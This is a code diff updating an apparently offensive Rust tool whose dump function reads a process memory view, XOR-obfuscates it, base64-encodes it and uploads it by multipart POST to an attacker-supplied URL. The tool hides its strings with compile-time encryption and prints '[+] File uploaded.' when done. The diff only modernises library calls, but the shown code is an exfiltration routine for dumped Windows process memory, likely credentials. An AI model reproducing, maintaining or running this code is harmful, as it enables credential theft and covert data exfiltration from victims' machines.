@@ -2,6 +2,7 @@
 //cargo rustc -- --crate-type cdylib 
 #[macro_use]
 extern crate litcrypt2;
+extern crate alloc;
 use_litcrypt!();
 
 extern crate base64;
@@ -17,6 +18,7 @@ use std::thread;
 use std::{fs::{self, File}, io::{Read, Write}, mem::size_of, ptr};
 use bindings::Windows::Win32::{Foundation::HANDLE, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
 use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, THREAD_BASIC_INFORMATION, GENERIC_READ, OVERLAPPED, REQUEST_OPLOCK_INPUT_BUFFER, REQUEST_OPLOCK_OUTPUT_BUFFER, THREAD_ALL_ACCESS, FILE_PROCESS_IDS_USING_FILE_INFORMATION};
+use base64::{engine::general_purpose, Engine};
 
 
 //#[no_mangle]
@@ -450,16 +452,15 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                     let _ = write!(data, "Content-Type: text/plain\r\n");
                                     let _ = write!(data, "\r\n");
 
-                                    let _ = write!(data, "{}", base64::encode(&view_xor));
+                                    let _ = write!(data, "{}", general_purpose::STANDARD.encode(&view_xor));
                                     let _ = write!(data, "\r\n"); // The key thing you are missing
                                     let _ = write!(data, "--{}--\r\n", boundary);
 
-                                    let read = Cursor::new(&data);
                                     let cont_type = format!("multipart/form-data; boundary={}", boundary);
                                     let _ = ureq::post(url)
-                                        .set("content-type",cont_type.as_str()) 
-                                        .set("Content-Length", data.len().to_string().as_str())
-                                        .send(read);
+                                        .header("content-type",cont_type.as_str()) 
+                                        .header("Content-Length", data.len().to_string().as_str())
+                                        .send(&data);
 
                                     println!("{}", &lc!("[+] File uploaded."));
                                 }
